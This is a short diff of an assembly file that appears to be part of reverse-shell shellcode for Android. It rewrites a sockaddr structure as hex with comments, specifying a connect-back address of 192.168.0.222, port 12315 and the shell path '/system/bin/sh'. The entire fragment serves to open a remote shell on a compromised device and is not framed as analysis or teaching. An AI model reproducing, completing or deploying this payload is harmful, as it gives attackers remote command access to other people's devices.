@@ -40,7 +40,9 @@ Lb:
 
 # struct sockaddr 
 .align 2
-.short 2
-.short 12315
+.short 0x2
+/* port 12315 */
+.short 0x301b
+/* ip */
 .byte 192,168,0,222
 .ascii "/system/bin/sh\0\0"
